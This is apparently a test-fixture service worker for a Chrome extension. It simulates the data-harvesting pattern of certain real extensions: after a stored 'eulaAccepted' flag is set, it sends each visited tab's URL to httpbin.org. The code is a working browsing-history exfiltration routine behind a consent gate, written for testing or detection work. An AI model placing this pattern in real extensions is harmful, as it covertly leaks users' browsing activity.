// Simulates: Smart Adblocker (eulaAccepted gate), StayFree (onboarding)
// Pattern: SW checks storage flag before exfiltrating. Flag set by popup.

const EXFIL_URL = 'https://httpbin.org/post';

chrome.tabs.onUpdated.addListener(async (tabId, changeInfo, tab) => {
  if (changeInfo.status !== 'complete' || !tab.url) return;
  if (tab.url.startsWith('chrome') || tab.url.startsWith('about')) return;

  const result = await chrome.storage.local.get('eulaAccepted');
  if (!result.eulaAccepted) {
    console.log('[TEST] EULA not accepted, skipping exfil');
    return;
  }

  console.log('[TEST] EULA accepted, exfiltrating URL');
  fetch(EXFIL_URL, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      type: 'eula_gated_exfil',
      url: tab.url,
      ts: Date.now(),
    }),
  }).catch(() => {});
});

setInterval(() => {}, 25000);
console.log('[TEST] EULA-gated SW started');
